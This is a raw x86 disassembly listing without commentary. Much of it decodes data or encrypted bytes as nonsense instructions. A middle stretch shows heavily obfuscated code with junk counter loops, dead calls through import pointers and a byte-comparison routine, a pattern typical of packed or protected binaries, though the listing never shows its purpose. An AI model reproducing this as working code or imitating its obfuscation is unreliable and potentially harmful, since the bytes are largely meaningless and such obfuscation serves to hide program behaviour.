  40ef9b:	cmp    ah,BYTE PTR [ecx+0x36]
  40ef9e:	mov    ecx,0xcf483931
  40efa3:	lods   al,BYTE PTR ds:[esi]
  40efa4:	or     al,0xe5
  40efa6:	jo     0x40ef4c
  40efa8:	imul   esp,edi,0x5035ed6
  40efae:	rol    BYTE PTR [eax+ebx*2],1
  40efb1:	(bad)  
  40efb2:	and    BYTE PTR [ebx+ebp*1-0x75],bh
  40efb6:	scas   eax,DWORD PTR es:[edi]
  40efb7:	add    BYTE PTR [esi-0x4f85a891],ch
  40efbd:	call   0xf3ca:0x4b34886e
  40efc4:	mov    bh,0xb8
  40efc6:	add    al,0xf1
  40efc8:	in     eax,dx
  40efc9:	mov    ah,0x95
  40efcb:	stos   BYTE PTR es:[edi],al
  40efcc:	aaa    
  40efcd:	and    ebx,DWORD PTR [ebx-0x28]
  40efd0:	sub    al,0xd7
  40efd2:	icebp  
  40efd3:	(bad)  
  40efd5:	int    0xf8
  40efd7:	pusha  
  40efd8:	aam    0xff
  40efda:	dec    esi
  40efdb:	adc    al,0x61
  40efdd:	mov    edx,0x580df764
  40efe2:	jno    0x40effa
  40efe4:	fs fs ins DWORD PTR es:[edi],dx
  40efe7:	xchg   ebx,eax
  40efe8:	icebp  
  40efe9:	inc    eax
  40efea:	cmc    
  40efeb:	push   es
  40efec:	add    al,0xd2
  40efee:	jae    0x40efd8
  40eff0:	or     ecx,eax
  40eff2:	repz and bl,dh
  40eff5:	sar    DWORD PTR [ecx-0x6e],cl
  40eff8:	adc    BYTE PTR [esi-0x3b],cl
  40effb:	test   al,0xf9
  40effd:	mov    ah,bl
  40efff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f000:	retf   
  40f001:	mov    DWORD PTR [ebp-0x21],esi
  40f004:	call   esp
  40f006:	xchg   DWORD PTR [eax+eiz*4],eax
  40f009:	popf   
  40f00a:	scas   eax,DWORD PTR es:[edi]
  40f00b:	call   0x5cc64299
  40f010:	jnp    0x40efa1
  40f012:	mov    ah,0xce
  40f014:	dec    esi
  40f015:	xchg   ecx,eax
  40f016:	imul   ebx,DWORD PTR [ecx],0xffffff83
  40f019:	out    dx,eax
  40f01a:	mov    dh,0x37
  40f01c:	leave  
  40f01d:	inc    edx
  40f01e:	enter  0x8699,0xda
  40f022:	cmc    
  40f023:	call   FWORD PTR fs:[ebx+eax*4+0x684608e6]
  40f02b:	jg     0x40f081
  40f02d:	fstp   QWORD PTR [esi-0x53]
  40f030:	jne    0x40efbc
  40f032:	push   ds
  40f033:	fistp  QWORD PTR [edx]
  40f035:	leave  
  40f036:	loop   0x40f084
  40f038:	sbb    DWORD PTR ds:0xab971b5a,0xffffffe9
  40f03f:	outs   dx,DWORD PTR ds:[esi]
  40f040:	mov    DWORD PTR [ebp-0x19],0x98b0bd42
  40f047:	popa   
  40f048:	jmp    0xa883b783
  40f04d:	xlat   BYTE PTR ds:[ebx]
  40f04e:	push   eax
  40f04f:	xlat   BYTE PTR ds:[ebx]
  40f050:	inc    edi
  40f051:	mov    eax,ds:0xeae1b66e
  40f056:	xor    esp,edx
  40f058:	imul   edx,DWORD PTR [edx+eax*4],0x3a
  40f05c:	sub    BYTE PTR [ebx+0x7745b8fb],dl
  40f062:	mov    ?,WORD PTR [ebx+0x6f]
  40f065:	es in  al,0xd9
  40f068:	pop    ds
  40f069:	imul   edx,DWORD PTR [edi],0xffffffda
  40f06c:	jb     0x40f043
  40f06e:	mov    dl,0x81
  40f070:	shl    BYTE PTR es:[edi+0x5e],0xf
  40f075:	call   0xfbe7:0x9e8bb34a
  40f07c:	push   ebx
  40f07d:	sahf   
  40f07e:	inc    ecx
  40f07f:	test   DWORD PTR [ecx-0x29],ebx
  40f082:	in     eax,dx
  40f083:	jo     0x40f0f8
  40f085:	into   
  40f086:	outs   dx,DWORD PTR ds:[esi]
  40f087:	lahf   
  40f088:	sbb    al,BYTE PTR [ebp+0x4e398707]
  40f08e:	sub    BYTE PTR [ebx+0x44cf4a26],0xee
  40f095:	pop    es
  40f096:	xchg   ebx,eax
  40f097:	dec    ebp
  40f098:	lds    esi,FWORD PTR [ebx]
  40f09a:	sub    bh,BYTE PTR [edi]
  40f09c:	xor    DWORD PTR [edi+0x22baf6ed],eax
  40f0a2:	call   0xf3074cfa
  40f0a7:	mov    dl,ch
  40f0a9:	fs stos DWORD PTR es:[edi],eax
  40f0ab:	pusha  
  40f0ac:	xor    al,0xa3
  40f0ae:	inc    eax
  40f0af:	jl     0x40f0bf
  40f0b1:	sbb    esp,DWORD PTR [ebp+0x30a6ebcd]
  40f0b7:	pop    esi
  40f0b8:	mov    edi,DWORD PTR [edx]
  40f0ba:	pop    esp
  40f0bb:	cdq    
  40f0bc:	lods   eax,DWORD PTR ds:[esi]
  40f0bd:	inc    esi
  40f0be:	aas    
  40f0bf:	out    dx,eax
  40f0c0:	sub    cl,BYTE PTR [eax-0x34dc4010]
  40f0c6:	(bad)  
  40f0c7:	jne    0x40f076
  40f0c9:	jle    0x40f10c
  40f0cb:	fild   DWORD PTR [ebp+0xd]
  40f0ce:	cmp    al,0xf9
  40f0d0:	dec    ebp
  40f0d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0d2:	sbb    al,0x81
  40f0d4:	call   0x1de60971
  40f0d9:	out    dx,eax
  40f0da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0db:	ins    DWORD PTR es:[edi],dx
  40f0dc:	call   0x8900b84a
  40f0e1:	add    esp,edx
  40f0e3:	and    BYTE PTR [eax+0x711a481c],al
  40f0e9:	stos   DWORD PTR es:[edi],eax
  40f0ea:	jge    0x40f070
  40f0ec:	add    eax,0x5d331392
  40f0f1:	jae    0x40f07e
  40f0f3:	outs   dx,DWORD PTR ds:[esi]
  40f0f4:	inc    edx
  40f0f5:	(bad)
  40f0f8:	inc    ecx
  40f0f9:	ret    
  40f0fa:	sbb    eax,0xf8edba87
  40f0ff:	call   0xb8fc:0x4f642668
  40f106:	mov    edi,0x45320a51
  40f10b:	cmp    esi,DWORD PTR [ebx]
  40f10d:	pop    esp
  40f10e:	mov    bl,bh
  40f110:	and    eax,0xdcc3e4ef
  40f115:	ror    BYTE PTR [esi+eiz*1],1
  40f118:	xchg   esi,eax
  40f119:	sbb    BYTE PTR [eax-0x6d78d8e6],0xbd
  40f120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f121:	xor    bl,BYTE PTR [ebp+ecx*2-0x2216be20]
  40f128:	pop    edi
  40f129:	pop    esi
  40f12a:	xchg   ebp,eax
  40f12b:	mov    ch,0x3c
  40f12d:	jne    0x40f0b2
  40f12f:	inc    ebx
  40f130:	iret   
  40f131:	adc    DWORD PTR [edi+0x2c],ebp
  40f134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f135:	cmp    eax,0x392035a7
  40f13a:	dec    ebp
  40f13b:	shl    al,cl
  40f13d:	dec    ecx
  40f13e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f13f:	add    ecx,DWORD PTR [eax+0x5]
  40f142:	repz dec esi
  40f144:	rcl    BYTE PTR [ebx],cl
  40f146:	pop    edx
  40f147:	adc    eax,0xa27ca46c
  40f14c:	js     0x40f1a3
  40f14e:	das    
  40f14f:	xchg   esp,eax
  40f150:	fwait
  40f151:	pop    ebp
  40f152:	(bad)  
  40f153:	loope  0x40f0ff
  40f155:	xor    BYTE PTR [edi-0x78b6dea3],cl
  40f15b:	pop    ebp
  40f15c:	adc    dh,al
  40f15e:	xor    edi,edx
  40f160:	fild   WORD PTR [ebp+0x40]
  40f163:	mov    ebx,0xb0f99144
  40f168:	outs   dx,BYTE PTR ds:[esi]
  40f169:	out    dx,al
  40f16a:	xor    ebx,esi
  40f16c:	jno    0x40f11c
  40f16e:	mov    esp,0x8ce6dc34
  40f173:	shl    edi,1
  40f175:	mov    ch,0xb0
  40f177:	cmp    al,0x51
  40f179:	test   al,bh
  40f17b:	fsub   QWORD PTR ds:0xce176c14
  40f181:	adc    edi,DWORD PTR [edi-0x3ae54da4]
  40f187:	sbb    esp,eax
  40f189:	fdiv   DWORD PTR [ebx]
  40f18b:	imul   ebp,DWORD PTR [eax-0x28],0x10cda6c1
  40f192:	cmp    BYTE PTR [ecx-0x2b],0x1
  40f196:	fbstp  TBYTE PTR [ebx]
  40f198:	jno    0x40f1d5
  40f19a:	fldenv [edx+0x7d]
  40f19d:	iret   
  40f19e:	repnz dec BYTE PTR [edx+0x24]
  40f1a2:	jp     0x40f162
  40f1a4:	dec    DWORD PTR [eax+0x417e06ce]
  40f1aa:	push   0x71
  40f1ac:	ins    DWORD PTR es:[edi],dx
  40f1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ae:	ins    DWORD PTR es:[edi],dx
  40f1af:	in     al,dx
  40f1b0:	xchg   esi,eax
  40f1b1:	pop    esi
  40f1b2:	out    dx,eax
  40f1b3:	lods   al,BYTE PTR ds:[esi]
  40f1b4:	pop    ebp
  40f1b5:	mov    bl,0x36
  40f1b7:	cmp    al,0x19
  40f1b9:	call   0xcb:0xeebcea1b
  40f1c0:	ins    BYTE PTR es:[edi],dx
  40f1c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1c2:	inc    eax
  40f1c3:	das    
  40f1c4:	fst    QWORD PTR [esi-0x6597b2fd]
  40f1ca:	rcl    dh,1
  40f1cc:	dec    edi
  40f1cd:	sub    BYTE PTR [ebx],ch
  40f1cf:	mov    bh,BYTE PTR [eax]
  40f1d1:	xor    dh,bh
  40f1d3:	push   ebx
  40f1d4:	(bad)  
  40f1d5:	cld    
  40f1d6:	add    eax,0x3f8acc0f
  40f1db:	arpl   bx,di
  40f1dd:	pop    esp
  40f1de:	mov    ds:0x361abe4b,eax
  40f1e3:	lods   eax,DWORD PTR ds:[esi]
  40f1e4:	aas    
  40f1e5:	inc    esp
  40f1e6:	push   edi
  40f1e7:	cmp    DWORD PTR [edx+ebp*2+0x18],edi
  40f1eb:	mov    al,ds:0xfc260bcd
  40f1f0:	lods   eax,DWORD PTR ds:[esi]
  40f1f1:	or     al,0x9e
  40f1f3:	jg     0x40f180
  40f1f5:	adc    esp,DWORD PTR [edi-0x6f]
  40f1f8:	jno    0x40f1bb
  40f1fa:	mov    ecx,0x9d767839
  40f1ff:	fsubr  QWORD PTR [esp+eax*1+0x74]
  40f203:	mov    ds:0x12796be8,eax
  40f208:	cs aaa 
  40f20a:	ret    
  40f20b:	std    
  40f20c:	inc    ecx
  40f20d:	ret    
  40f20e:	push   eax
  40f20f:	popf   
  40f210:	add    eax,0x3e2cb59e
  40f215:	xor    al,0x4b
  40f217:	aad    0x4c
  40f219:	mov    dl,0xbb
  40f21b:	add    edx,ebp
  40f21d:	pop    ss
  40f21e:	into   
  40f21f:	mov    ebp,0x3b3b700d
  40f224:	dec    esp
  40f225:	sub    dl,BYTE PTR [esi+0x1a3b44ad]
  40f22b:	pop    eax
  40f22c:	into   
  40f22d:	adc    BYTE PTR [eax+0x6714a993],ch
  40f233:	pop    ebp
  40f234:	push   ecx
  40f235:	cwde   
  40f236:	and    al,0x36
  40f238:	adc    BYTE PTR [edx],bh
  40f23a:	sub    eax,0x79c1a1fb
  40f23f:	stos   BYTE PTR es:[edi],al
  40f240:	test   DWORD PTR [esi],ebp
  40f242:	out    dx,eax
  40f243:	or     dl,BYTE PTR [esi+0x29]
  40f246:	std    
  40f247:	ret    
  40f248:	mov    al,0xb8
  40f24a:	mov    esp,0xf5eca632
  40f24f:	push   eax
  40f250:	in     eax,0x9b
  40f252:	in     al,0x4b
  40f254:	aad    0xc7
  40f256:	scas   al,BYTE PTR es:[edi]
  40f257:	icebp  
  40f258:	xor    BYTE PTR [ebp-0x1a],0xe0
  40f25c:	fst    DWORD PTR [edi]
  40f25e:	fdivr  st(4),st
  40f260:	mov    esp,0x359b95dd
  40f265:	pop    esi
  40f266:	cs std 
  40f268:	rcr    DWORD PTR [ebp-0x2a77d705],cl
  40f26e:	pop    ss
  40f26f:	clc    
  40f270:	bound  edx,QWORD PTR [ecx+0x41]
  40f273:	gs aam 0x8d
  40f276:	dec    edi
  40f277:	imul   ebp,DWORD PTR ds:0x7db0ef48,0xffffff89
  40f27e:	mov    ah,0x9c
  40f280:	rcr    DWORD PTR [eax-0x5c],0xc0
  40f284:	mov    al,ds:0x25185f3
  40f289:	add    DWORD PTR [edx+0x3e],ebp
  40f28c:	cmp    dl,cl
  40f28e:	sar    BYTE PTR [edx+0x35d9401e],0x1d
  40f295:	loop   0x40f2e7
  40f297:	dec    ecx
  40f298:	int    0x56
  40f29a:	xchg   esp,eax
  40f29b:	adc    bl,BYTE PTR [eax+0x5a]
  40f29e:	push   es
  40f29f:	nop
  40f2a0:	ss repnz mov ch,0x83
  40f2a4:	pop    ebp
  40f2a5:	js     0x40f296
  40f2a7:	mov    dl,0x73
  40f2a9:	inc    edx
  40f2aa:	push   ebp
  40f2ab:	mov    bl,0xf0
  40f2ad:	out    dx,al
  40f2ae:	scas   al,BYTE PTR es:[edi]
  40f2af:	adc    BYTE PTR [edx],dl
  40f2b1:	push   eax
  40f2b2:	push   es
  40f2b3:	test   eax,0xe3bdd922
  40f2b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2b9:	sbb    BYTE PTR [edi],bh
  40f2bb:	and    al,0x55
  40f2bd:	lods   al,BYTE PTR fs:[esi]
  40f2bf:	sub    esp,DWORD PTR [ecx-0x3dc36a4a]
  40f2c5:	mov    al,ds:0x6c829914
  40f2ca:	xchg   esp,eax
  40f2cb:	clc    
  40f2cc:	leave  
  40f2cd:	rcl    BYTE PTR [ecx-0x74c587ac],1
  40f2d3:	xchg   esi,eax
  40f2d4:	dec    ecx
  40f2d5:	pavgb  mm6,QWORD PTR [edx+eiz*2+0x7e]
  40f2da:	mov    ch,0x75
  40f2dc:	xchg   edi,eax
  40f2dd:	ja     0x40f30a
  40f2df:	mov    BYTE PTR [ecx-0x61643928],ch
  40f2e5:	push   0x1fb50dfc
  40f2ea:	mov    esi,0xeaac4a7f
  40f2ef:	sub    BYTE PTR [ecx+0x6d],dl
  40f2f2:	in     al,dx
  40f2f3:	push   ebx
  40f2f4:	cmp    ebx,ecx
  40f2f6:	add    al,bh
  40f2f8:	mov    bh,bl
  40f2fa:	cld    
  40f2fb:	ficom  WORD PTR [ecx-0x46200de8]
  40f301:	adc    dh,BYTE PTR [ebx]
  40f303:	in     al,dx
  40f304:	jnp    0x40f28e
  40f306:	outs   dx,DWORD PTR ds:[esi]
  40f307:	cs sub eax,0xa1b8d9b8
  40f30d:	(bad)  
  40f30e:	idiv   edx
  40f310:	pop    ecx
  40f311:	retf   
  40f312:	or     edi,esi
  40f314:	sub    esp,ebp
  40f316:	jg     0x40f343
  40f318:	scas   al,BYTE PTR es:[edi]
  40f319:	adc    eax,0xfce23529
  40f31e:	inc    esi
  40f31f:	dec    DWORD PTR [eax]
  40f321:	and    ch,0xee
  40f324:	adc    BYTE PTR [esi-0x7],bl
  40f327:	repz into 
  40f329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f32a:	cld    
  40f32b:	sti    
  40f32c:	into   
  40f32d:	stos   DWORD PTR es:[edi],eax
  40f32e:	bound  esi,QWORD PTR [ebp+0x68]
  40f331:	jne    0x40f330
  40f333:	xchg   esi,eax
  40f334:	les    eax,FWORD PTR [edi]
  40f336:	mov    ds:0xdb975ccf,al
  40f33b:	bound  esi,QWORD PTR [ebx+edx*4]
  40f33e:	neg    DWORD PTR [ecx+0x44]
  40f341:	mul    DWORD PTR [ebp+0x425e4f6]
  40f347:	in     al,dx
  40f348:	fdiv   QWORD PTR [eax+0x2d]
  40f34b:	stos   BYTE PTR es:[edi],al
  40f34c:	gs test al,0x18
  40f34f:	xchg   esi,eax
  40f350:	js     0x40f338
  40f352:	scas   eax,DWORD PTR es:[edi]
  40f353:	add    edx,edi
  40f355:	or     DWORD PTR ds:0x434004,0x43601c
  40f35f:	and    edx,ebx
  40f361:	mov    DWORD PTR [ebp-0x4c],edx
  40f364:	sbb    ebx,edx
  40f366:	mov    edx,DWORD PTR [ebp+0x8]
  40f369:	and    ebx,DWORD PTR ds:0x436000
  40f36f:	mov    ebx,DWORD PTR [ebp-0x48]
  40f372:	and    DWORD PTR ds:0x434008,0x438000
  40f37c:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f383:	movzx  ebx,BYTE PTR ds:0x437010
  40f38a:	and    DWORD PTR ds:0x438004,ebx
  40f390:	mov    DWORD PTR [ebp-0x48],edx
  40f393:	and    ebx,DWORD PTR ds:0x43501c
  40f399:	mov    edx,DWORD PTR [ebp+0x8]
  40f39c:	mov    ebx,0xfa5e15e2
  40f3a1:	sub    ebx,edx
  40f3a3:	or     DWORD PTR ds:0x43801c,0x224f
  40f3ad:	add    ebx,DWORD PTR [ebp-0x44]
  40f3b0:	mov    DWORD PTR [ebp-0x44],ebx
  40f3b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f3b6:	xor    edx,eax
  40f3b8:	or     DWORD PTR ds:0x43801c,0x42c8
  40f3c2:	add    edx,esi
  40f3c4:	mov    DWORD PTR ds:0x434008,0x7004
  40f3ce:	jne    0x40ab4e
  40f3d4:	jmp    0x4163dd
  40f3d9:	mov    DWORD PTR ds:0x438008,0x1c
  40f3e3:	cmp    DWORD PTR ds:0x438008,0x0
  40f3ea:	je     0x40f448
  40f3f0:	cmp    DWORD PTR ds:0x438008,0x4
  40f3f7:	jl     0x40f448
  40f3fd:	jmp    0x40f41a
  40f402:	push   DWORD PTR [ebp-0x24]
  40f405:	push   0x3847
  40f40a:	push   0x753d
  40f40f:	push   0x26fc
  40f414:	call   DWORD PTR ds:0x43a8e8
  40f41a:	cmp    DWORD PTR ds:0x438008,0x5
  40f421:	jne    0x40f436
  40f427:	xor    edx,edx
  40f429:	xor    edx,DWORD PTR ds:0x438008
  40f42f:	dec    edx
  40f430:	mov    DWORD PTR ds:0x438008,edx
  40f436:	mov    edx,DWORD PTR ds:0x438008
  40f43c:	dec    edx
  40f43d:	mov    DWORD PTR ds:0x438008,edx
  40f443:	jmp    0x40f3e3
  40f448:	mov    edx,DWORD PTR [ebp-0xc]
  40f44b:	neg    DWORD PTR ds:0x434004
  40f451:	sub    edx,esi
  40f453:	xor    edx,eax
  40f455:	mov    DWORD PTR [ebp-0x5c],edx
  40f458:	mov    edx,DWORD PTR [ebp-0x10]
  40f45b:	mov    ebx,DWORD PTR [ebp-0x8]
  40f45e:	or     DWORD PTR ds:0x438018,0x434020
  40f468:	xor    edx,eax
  40f46a:	xor    ebx,eax
  40f46c:	adc    DWORD PTR ds:0x438000,0x7999
  40f476:	sub    edx,ebx
  40f478:	and    DWORD PTR ds:0x43500c,0x6f6
  40f482:	sub    edx,esi
  40f484:	xor    edx,eax
  40f486:	mov    DWORD PTR [ebp-0x10],edx
  40f489:	mov    DWORD PTR ds:0x435000,0x69ba
  40f493:	mov    edx,DWORD PTR [ebp-0x14]
  40f496:	mov    DWORD PTR ds:0x436008,0x7efb
  40f4a0:	mov    DWORD PTR [ebp+0x8],edx
  40f4a3:	jmp    0x40f6a5
  40f4a8:	mov    DWORD PTR ds:0x434000,0x12
  40f4b2:	cmp    DWORD PTR ds:0x434000,0x0
  40f4b9:	je     0x40f505
  40f4bf:	cmp    DWORD PTR ds:0x434000,0x4
  40f4c6:	jb     0x40f505
  40f4cc:	jmp    0x40f4d7
  40f4d1:	call   DWORD PTR ds:0x43a8f0
  40f4d7:	cmp    DWORD PTR ds:0x434000,0x5
  40f4de:	jne    0x40f4f3
  40f4e4:	xor    edx,edx
  40f4e6:	xor    edx,DWORD PTR ds:0x434000
  40f4ec:	dec    edx
  40f4ed:	mov    DWORD PTR ds:0x434000,edx
  40f4f3:	mov    edx,DWORD PTR ds:0x434000
  40f4f9:	dec    edx
  40f4fa:	mov    DWORD PTR ds:0x434000,edx
  40f500:	jmp    0x40f4b2
  40f505:	mov    edx,DWORD PTR [ebp+0x8]
  40f508:	mov    ebx,DWORD PTR [ebp-0x8]
  40f50b:	adc    DWORD PTR ds:0x436008,0x434014
  40f515:	xor    edx,eax
  40f517:	sub    DWORD PTR ds:0x438010,0x434018
  40f521:	xor    ebx,eax
  40f523:	sub    edx,ebx
  40f525:	sub    edx,esi
  40f527:	and    DWORD PTR ds:0x437014,0x0
  40f531:	mov    ebx,DWORD PTR ds:0x437014
  40f537:	inc    ebx
  40f538:	mov    DWORD PTR ds:0x437014,ebx
  40f53e:	cmp    DWORD PTR ds:0x437014,0x4
  40f545:	jge    0x40f582
  40f54b:	jmp    0x40f55b
  40f550:	push   0x7690
  40f555:	call   DWORD PTR ds:0x43a8f4
  40f55b:	cmp    DWORD PTR ds:0x437014,0x3
  40f562:	jne    0x40f575
  40f568:	mov    ebx,DWORD PTR ds:0x437014
  40f56e:	inc    ebx
  40f56f:	mov    DWORD PTR ds:0x437014,ebx
  40f575:	cmp    DWORD PTR ds:0x437014,0x1b
  40f57c:	jb     0x40f531
  40f582:	xor    edx,eax
  40f584:	movzx  ebx,WORD PTR ds:0x435010
  40f58b:	adc    DWORD PTR ds:0x434020,ebx
  40f591:	mov    DWORD PTR [ebp+0x8],edx
  40f594:	and    DWORD PTR ds:0x435018,0x0
  40f59e:	jmp    0x40f5b0
  40f5a3:	mov    edx,DWORD PTR ds:0x435018
  40f5a9:	inc    edx
  40f5aa:	mov    DWORD PTR ds:0x435018,edx
  40f5b0:	cmp    DWORD PTR ds:0x435018,0x18
  40f5b7:	jae    0x40f5e4
  40f5bd:	cmp    DWORD PTR ds:0x435018,0x22
  40f5c4:	jbe    0x40f5e4
  40f5ca:	jmp    0x40f5df
  40f5cf:	push   0x6f28
  40f5d4:	push   0x4b78
  40f5d9:	call   DWORD PTR ds:0x43a8f8
  40f5df:	jmp    0x40f5a3
  40f5e4:	mov    edx,DWORD PTR [ebp+0x8]
  40f5e7:	sbb    DWORD PTR ds:0x434004,edx
  40f5ed:	mov    ebx,DWORD PTR [ebp-0x58]
  40f5f0:	add    edx,0x5708c4
  40f5f6:	adc    DWORD PTR ds:0x437004,0x434004
  40f600:	imul   edx,ebx
  40f603:	mov    ebx,DWORD PTR ds:0x43701c
  40f609:	adc    DWORD PTR ds:0x43801c,ebx
  40f60f:	mov    DWORD PTR [ebp-0x58],edx
  40f612:	mov    edx,DWORD PTR [ebp+0x8]
  40f615:	xor    DWORD PTR ds:0x435010,edx
  40f61b:	mov    ebx,DWORD PTR [ebp-0x54]
  40f61e:	adc    DWORD PTR ds:0x43600c,0x437010
  40f628:	add    edx,0x64f8da
  40f62e:	or     edx,ebx
  40f630:	mov    DWORD PTR [ebp-0x54],edx
  40f633:	mov    edx,DWORD PTR [ebp+0x8]
  40f636:	adc    ebx,DWORD PTR ds:0x436014
  40f63c:	mov    ebx,DWORD PTR [ebp-0x50]
  40f63f:	add    edx,ecx
  40f641:	adc    DWORD PTR ds:0x43401c,0x78dc
  40f64b:	xor    edx,ebx
  40f64d:	adc    DWORD PTR ds:0x437014,0x50e3
  40f657:	mov    DWORD PTR [ebp-0x50],edx
  40f65a:	adc    DWORD PTR ds:0x434008,0x291b
  40f664:	mov    edx,DWORD PTR [ebp+0x8]
  40f667:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f66a:	and    DWORD PTR ds:0x438010,0x434004
  40f674:	add    edx,edi
  40f676:	add    DWORD PTR ds:0x436018,0x43800c
  40f680:	and    edx,ebx
  40f682:	mov    DWORD PTR [ebp-0x4c],edx
  40f685:	mov    edx,DWORD PTR [ebp+0x8]
  40f688:	mov    ebx,DWORD PTR [ebp-0x48]
  40f68b:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f692:	mov    DWORD PTR [ebp-0x48],edx
  40f695:	mov    edx,DWORD PTR [ebp+0x8]
  40f698:	mov    ebx,0xfa5e15e2
  40f69d:	sub    ebx,edx
  40f69f:	add    ebx,DWORD PTR [ebp-0x44]
  40f6a2:	mov    DWORD PTR [ebp-0x44],ebx
  40f6a5:	mov    edx,DWORD PTR [ebp+0x8]
  40f6a8:	xor    edx,eax
  40f6aa:	add    edx,esi
  40f6ac:	jne    0x40f4a8
  40f6b2:	mov    edx,DWORD PTR [ebp-0xc]
  40f6b5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6bc:	mov    bl,BYTE PTR [ebp-0x1]
  40f6bf:	cmp    dl,bl
  40f6c1:	je     0x411b53
  40f6c7:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6ca:	mov    edx,DWORD PTR [ebp-0xc]
  40f6cd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6d4:	mov    ebx,DWORD PTR [ebp+0xc]
  40f6d7:	xor    ecx,eax
  40f6d9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  40f6e0:	jne    0x4163ef
  40f6e6:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6e9:	mov    edx,DWORD PTR [ebp+0xc]
  40f6ec:	xor    ecx,eax
  40f6ee:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  40f6f6:	jmp    0x411aaa
  40f6fb:	ficomp WORD PTR ds:0x81a319e0
  40f701:	xchg   DWORD PTR [ebx-0x12a5fb05],ebx
  40f707:	sub    eax,0xdcd62959
  40f70c:	int    0x7c
  40f70e:	jl     0x40f6fb
  40f710:	pop    edi
  40f711:	jl     0x40f78f
  40f713:	aad    0xcb
  40f715:	pop    ss
  40f716:	imul   ebx,DWORD PTR [eax],0x5a
  40f719:	sti    
  40f71a:	out    0xd0,al
  40f71c:	xor    DWORD PTR [ebp+0x55],0xcea5efef
  40f723:	jb     0x40f742
  40f725:	scas   al,BYTE PTR es:[edi]
  40f726:	rcr    BYTE PTR [edx-0x65],1
  40f729:	push   ebp
  40f72a:	sbb    ch,bl
  40f72c:	push   edi
  40f72d:	xor    ebp,DWORD PTR [ebx-0x65e6b4dc]
  40f733:	xlat   BYTE PTR ds:[ebx]
  40f734:	adc    al,0x9d
  40f736:	jg     0x40f6cd
  40f738:	fidiv  WORD PTR [ecx+0x79]
  40f73b:	lods   al,BYTE PTR ds:[esi]
  40f73c:	push   edx
  40f73d:	dec    esi
  40f73e:	sbb    eax,0x96c858ca
  40f743:	popf   
  40f744:	(bad)  
  40f745:	inc    ebp
  40f747:	(bad)  
  40f748:	repnz pop ebx
  40f74a:	mov    BYTE PTR [esi+0x40],al
  40f74d:	fwait
  40f74e:	mov    ch,0xc2
  40f750:	outs   dx,BYTE PTR ds:[esi]
  40f751:	(bad)  
  40f752:	push   ss
  40f753:	cmpps  xmm2,XMMWORD PTR [esi+esi*4],0x5b
  40f758:	fnstsw WORD PTR [ebp-0x1086667b]
  40f75e:	ret    0x8bc1
  40f761:	int3   
  40f762:	pop    edx
  40f763:	or     BYTE PTR [esp+edi*8+0x75],dl
  40f767:	sub    BYTE PTR [eax],0xae
  40f76a:	scas   al,BYTE PTR es:[edi]
  40f76b:	jmp    0xa28d:0x3c4d5286
  40f772:	aad    0xb4
  40f774:	mov    ds:0x69e56dbf,al
  40f779:	pop    es
  40f77a:	add    al,0x66
  40f77c:	loopne 0x40f7ce
  40f77e:	rol    DWORD PTR [esi+ebp*2-0x3094263],0xe1
  40f786:	inc    edi
  40f787:	push   edx
  40f788:	mov    eax,ds:0x4727fac4
  40f78d:	ror    DWORD PTR [edx-0x67923ab9],1
  40f793:	ss aad 0xb4
  40f796:	xchg   ebp,eax
  40f797:	add    eax,DWORD PTR [ebx-0x72ba82f3]
  40f79d:	mov    dl,0x91
  40f79f:	push   ss
  40f7a0:	jecxz  0x40f7a3
  40f7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7a3:	fstp   QWORD PTR [ebx-0x71]
  40f7a6:	adc    DWORD PTR [esp+ebx*8],ecx
  40f7a9:	std    
  40f7aa:	imul   ecx,DWORD PTR [ebp+ecx*2-0x41],0x3a97af89
  40f7b2:	push   si
  40f7b4:	fs scas eax,DWORD PTR es:[edi]
  40f7b6:	dec    edi
  40f7b7:	pop    ds
  40f7b8:	fidivr WORD PTR [edi+0x4ee1aaa5]
  40f7be:	(bad)  
  40f7bf:	fcmovu st,st(6)
  40f7c1:	jae    0x40f773
  40f7c3:	jb     0x40f7e8
  40f7c5:	push   edx
  40f7c6:	sar    ecx,1
  40f7c8:	and    ebx,DWORD PTR [edx]
  40f7ca:	out    0x9a,al
  40f7cc:	outs   dx,BYTE PTR ds:[esi]
  40f7cd:	lods   al,BYTE PTR gs:[esi]
  40f7cf:	jno    0x40f797
  40f7d1:	sub    al,0xc2
  40f7d3:	sbb    esi,ebx
  40f7d5:	sub    BYTE PTR [esi+0x61],ch
  40f7d8:	pop    edi
  40f7d9:	iret   
  40f7da:	adc    esi,DWORD PTR [edi+0x3ea883d9]
  40f7e0:	fdiv   DWORD PTR [eax+0x72]
  40f7e3:	and    bh,cl
  40f7e5:	adc    dh,BYTE PTR [edi+0x69]
  40f7e8:	add    bh,BYTE PTR [ebx]
  40f7ea:	pop    esp
  40f7eb:	mov    bl,0x29
  40f7ed:	xor    edi,esi
  40f7ef:	jns    0x40f7d1
  40f7f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7f2:	push   ds
  40f7f3:	and    DWORD PTR [esi],eax
  40f7f5:	inc    eax
  40f7f6:	icebp  
  40f7f7:	mov    edi,0x48c6f6a4
  40f7fc:	clc    
  40f7fd:	in     eax,dx
  40f7fe:	imul   esp,ebp,0xffffff9d
  40f801:	push   esp
  40f802:	inc    ebp
  40f803:	mov    al,ds:0xa555bac7
  40f808:	shl    ecx,1
